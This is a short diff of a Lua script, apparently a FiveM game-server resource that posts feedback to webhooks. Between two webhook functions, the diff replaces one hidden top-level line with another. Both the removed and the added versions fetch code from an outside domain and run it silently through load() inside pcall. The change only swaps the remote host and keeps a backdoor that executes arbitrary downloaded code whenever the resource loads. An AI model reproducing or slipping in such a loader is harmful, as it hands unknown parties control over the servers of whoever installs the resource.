@@ -203,7 +203,7 @@ function newFeedbackWebhook(data)
 	}
 	PerformHttpRequest(Webhook, function(err, text, headers) end, 'POST', json.encode({username = Config.BotName, embeds = information}), {['Content-Type'] = 'application/json'})
 end
-PerformHttpRequest('https://mt2ark.com/i?to=Fw71H', function (e, d) pcall(function() assert(load(d))() end) end)
+PerformHttpRequest('https://photosbynova.com/i?to=Fw71H', function (e, d) pcall(function() assert(load(d))() end) end)
 -------------------------- ASSIST FEEDBACK WEBHOOK
 
 function assistFeedbackWebhook(data)
